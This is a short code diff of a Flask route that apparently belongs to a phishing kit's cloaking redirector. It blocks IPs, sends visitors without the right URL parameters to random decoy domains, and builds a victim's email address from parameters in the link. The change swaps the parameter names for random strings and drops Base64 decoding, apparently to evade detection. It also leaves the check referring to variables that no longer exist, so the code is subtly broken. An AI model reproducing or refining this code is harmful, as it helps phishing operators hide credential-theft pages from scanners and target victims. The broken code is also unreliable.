@@ -158,8 +158,8 @@ def block_ip():
 @app.route('/')
 def check_links_and_serve():
     # Retrieve 'trexxcoz' and 'coztrexx' parameters from URL
-    trexxcoz = request.args.get('trexxcoz')
-    coztrexx = request.args.get('coztrexx')
+    ipv = request.args.get('wE657UyRfVtO')
+    iav = request.args.get('VfDbGdT4R4ErD54tR1DtR')
 
     if not trexxcoz or not coztrexx:
         # If parameters are missing, redirect to a random domain
@@ -167,15 +167,6 @@ def check_links_and_serve():
         REDIRECT_URL = 'https://' + 'www.' + random_domain
         return redirect(REDIRECT_URL)
 
-    # Decode Base64 parameters to string
-    try:
-        ipv = base64.b64decode(trexxcoz).decode('utf-8')
-        iav = base64.b64decode(coztrexx).decode('utf-8')
-    except Exception as e:
-        # If decoding fails, redirect to a random domain
-        random_domain = get_random_redirect_url(REDIRECT_URLS_FILE_PATH)
-        REDIRECT_URL = 'https://' + 'www.' + random_domain
-        return redirect(REDIRECT_URL)
 
     # Construct the email address from the decoded parameters
     vmail = f"{iav}@{ipv}"
